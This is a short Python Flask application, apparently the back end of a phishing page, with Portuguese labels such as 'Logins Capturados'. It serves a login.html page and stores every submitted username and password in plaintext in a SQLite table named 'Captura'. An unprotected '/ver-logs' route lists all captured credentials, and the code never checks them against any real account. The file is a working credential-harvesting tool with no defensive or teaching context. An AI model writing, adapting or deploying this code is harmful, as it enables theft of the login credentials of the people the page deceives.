from flask import Flask, request, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import datetime

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///capturas.db'
db = SQLAlchemy(app)

class Captura(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False)
    password = db.Column(db.String(150), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

with app.app_context():
    db.create_all()

@app.route('/')
def home():
    return send_from_directory('.', 'login.html')

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or request.form
    username = data.get('username')
    password = data.get('password')
    
    if username and password:
        db.session.add(Captura(username=username, password=password))
        db.session.commit()
        return jsonify({'success': True}), 200
        
    return jsonify({'success': False}), 400

@app.route('/ver-logs')
def ver_logs():
    capturas = Captura.query.all()
    html = "<h2>Logins Capturados:</h2><ul>"
    for c in capturas:
        html += f"<li><b>Usuário:</b> {c.username} | <b>Senha:</b> {c.password} | <i>Data:</i> {c.created_at}</li>"
    html += "</ul>"
    return html

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)
